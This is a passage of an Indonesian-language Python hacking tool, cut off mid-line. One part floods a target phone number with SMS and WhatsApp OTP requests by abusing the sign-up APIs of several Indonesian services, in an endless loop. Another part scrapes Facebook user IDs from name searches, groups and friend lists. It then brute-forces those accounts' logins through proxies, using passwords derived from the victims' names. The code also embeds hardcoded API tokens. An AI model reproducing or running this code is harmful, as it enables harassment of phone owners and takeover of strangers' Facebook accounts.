					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"user-agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold red"))

#------------------[ DEFF SPAM WA ]-------------------# 

def spam_wa():
	global nomor
	cetak(panel(f''' [bold cyan]  Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,title=f"[bold red][[bold green] Spam WhatsApp [bold red]]",style=f"bold red"))
	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp : {P}+62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' {P}[{H}+{P}]\33[1;96m Sedang Spam...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "user-agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "user-agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(panel(f" \33[1;96mSukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold red"))
#----------------------[ CRACK USERNAME ]----------------------#
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(panel(f"    {O}Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,title=f"[bold red][[bold green] Crack Username [bold red]]",style=f"bold red"))
	nam = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r\33[1;96m Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(nel(f'[bold cyan]Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,title=f"[bold red][[bold green] Crack Email [bold red]]",style=f"bold red"))
	nama = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" {P}[{H}+{P}] \33[1;91mMasukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'[bold cyan]Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold red"))
	doma = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" {P}[{H}+{P}]\33[1;91m Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	cetak(nel(f'[bold cyan]Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold red"))
	jumlah = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Total Dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r \33[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
		
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	cetak(nel('[bold cyan] Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,title=f"[bold red][[bold green] Crack Grup [bold red]]",style=f"bold red"))
	link = input(f' {P}[{H}+{P}]\33[1;96m Id Group : {P}')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [+] \33[1;91m Gagal Dump Id Grup, Kemungkinan Grup Private')
	setting()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1; Valve Steam GameOverlay/1679680416) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r {P}[{H}+{P}]\33[1;96m Mengumpulkan {len(id)} Idz...');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Hasil CP[/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold red][[bold green] Hasil Result [bold red]]",style=f"bold red"))
	kz = input(f'{P}[{H}+{P}]\33[1;96m Pilih : {P}')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' [+] \33[1;91m File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' [+] \33[1;96mAnda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] \33[1;91mPilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' [+]\33[1;96mFile Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# +--> {cpkuni[0]} | {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input(' \33[1;96m ENTER')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' [+]\33[1;91m File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' [+]\33[1;91m Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n [+]\33[1;96m Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+]\33[1;91m Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[+]\33[1;91m File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# +--> {cpkuni[0]} | {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
				nocp +=1
			input(' \33[1;96m ENTER')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' [+]\33[1;91m Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def xyzoncrackpublik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	cetak(panel('\t          [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Massal [bold red]]",style=f"bold red"))
	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID :{P} ')
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		print(f' {P}[{H}+{P}]\33[1;96m Total ID yang Terkumpul : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' [+]\33[1;91m Internet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' [+]\33[1;91m Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
		exit()
#-------------------[ CRACK-MASAL ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		cetak(panel('\t          [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Massal [bold red]]",style=f"bold red"))
		jum = int(input(f' {P}[{H}+{P}]\33[1;96m Mau Berapa Idz Target  :{P} '))
	except ValueError:
		print(' [+]\33[1;91m Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f' [+]\33[1;91m Pertemanan Tidak Publik  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' \33[1;96mMasukan Idz Target Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' [+]\33[1;96m Unstable Signal ')
			exit()
	try:
		print(f' {P}[{H}+{P}]\33[1;96m Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' {P}[{H}+{P}]\33[1;96m Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f' [+]\33[1;91m Friendship Not Public {x}')
		time.sleep(3)
		back()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack Idz Old-New [bold white][[bold red]Not Good[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack Idz New-Old [bold white][[bold green]Very Good[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack Idz Random [bold white][[bold green]Good[bold white]][/]',width=90,title=f"[bold red][[bold green] Setting Urutan Idz [bold red]]",style=f"bold red"))
	hu = input(f' {P}[{H}+{P}] \33[1;96mPilih Urutan Idz : {P}')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' [+] \33[1;91mPilih Yang Bener Kontooll ')
		exit()
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Metode Mobile  [bold white][[bold green]Slow[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Metode Mbasic [bold white][[bold green]Slow[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Metode Free [bold white][[bold green]Very Slow[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold cyan]Metode B-Api [bold white][[bold green]Very Fast[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Metode Async [bold white][[bold green]Very Slow[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Metode Reguler [bold white][[bold green]Slow[bold white]][/]',width=90,title=f"[bold red][[bold green] Setting Metode [bold red]]",style=f"bold red"))
	hc = input(f' {P}[{H}+{P}] \33[1;96mPilih Metode :{P} ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('free')
	elif hc in ['4','04']:
		method.append('bapi')
	elif hc in ['5','05']:
		method.append('async')
	elif hc in ['6','06']:
	    method.append('reguler')
	else:
		method.append('mobile')
	cetak(panel('''[bold white][[bold green]01[bold white]] [bold cyan]Password Random[bold white] [[bold green]Good[bold white]]
[bold white][[bold green]02[bold white]] [bold cyan]Password Otomatis [bold white][[bold green]Very Good[bold white]]
[bold white][[bold green]03[bold white]] [bold cyan]Password Manual [bold white][[bold red]Not Good[bold white]]''',width=90,title=f"[bold red][[bold green] Setting Password[bold red]]",style=f"bold red"))
	pwplus=input(f' {P}[{H}+{P}]\33[1;96m Pilih sandi :{P} ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f' {P}[{H}+{P}]\33[1;96m Sandi : {P}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	
	cetak(panel(f'[bold cyan]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold red][[bold green] Setting User-Agent [bold red]]",style=f"bold red"))
	uatambah = input(f' {P}[{H}+{P}] \33[1;96mPilih :{P} ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukan User-Agent :{P} ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	print('')
	urut = []
	print(M+' <------------------------------------------------------------------------------------->')
	wa.print(Columns(urut))
	cetak(panel(f'\t      [bold cyan]Mainkan Mode Pesawat Setiap [bold yellow]1000 ID [bold cyan]Selama 2 Detik !',width=90,title=f"[bold red][[bold green] Info Crack [bold red]]",style=f"bold red"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'1')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'bapi' in method:
					pool.submit(crackbapi,idf,pwv)
				elif 'async' in method:
					pool.submit(crackasync,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'reguler' in method:
					pool.submit(crackreguler,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
	print(M+' <------------------------------------------------------------------------------------->')
	print(f' \33[1;96m Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))

#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D161285164570410%26redirect_uri%3Dhttps%253A%252F%252Fudb3lgn.nimo.tv%252Fweb%252Fcallback%26display%3Dpopup%26response_type%3Dcode%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522%253A%25222%2522%252C%2522terminal%2522%253A%2522web%2522%252C%2522type%2522%253A%2522fb%2522%252C%2522uri%2522%253A10001%252C%2522win%2522%253A%25220%2522%257D%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfdf8ac40-8c6a-45b8-a846-c6a01ebe4d2e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fudb3lgn.nimo.tv%2Fweb%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522%253A%25222%2522%252C%2522terminal%252')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=161285164570410&kid_directed_site=0&app_id=161285164570410&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D161285164570410%26redirect_uri%3Dhttps%253A%252F%252Fudb3lgn.nimo.tv%252Fweb%252Fcallback%26display%3Dpopup%26response_type%3Dcode%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522